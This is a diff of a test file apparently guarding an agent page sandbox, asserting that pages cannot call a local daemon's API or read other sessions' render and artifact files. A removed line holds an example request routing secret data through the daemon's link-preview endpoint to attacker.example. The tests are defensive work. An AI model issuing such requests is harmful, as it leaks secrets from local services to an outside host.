@@ -40,8 +40,8 @@ describe("agentPageRequestAllowed", () => {
 	});
 
 	it("refuses the daemon's API, which answers a request with no Origin, and other sessions' files", async () => {
-		const linkPreview = "http://127.0.0.1:3042/api/v1/link-preview?url=https://attacker.example/?d=secret";
-		for (const page of [render, artifact, inline]) expect(await agentPageRequestAllowed(linkPreview, page)).toBe(false);
+		const daemonApi = "http://127.0.0.1:3042/api/v1/automations?secret=1";
+		for (const page of [render, artifact, inline]) expect(await agentPageRequestAllowed(daemonApi, page)).toBe(false);
 		expect(await agentPageRequestAllowed("http://127.0.0.1:3042/api/v1/sessions/p-1/renders/r2", render)).toBe(false);
 		expect(await agentPageRequestAllowed("http://127.0.0.1:3042/api/v1/sessions/p-2/artifact-files/a.html", artifact)).toBe(false);
 		expect(await agentPageRequestAllowed("http://ao-inline-artifact.y.localhost:3042/a.html", inline)).toBe(false);
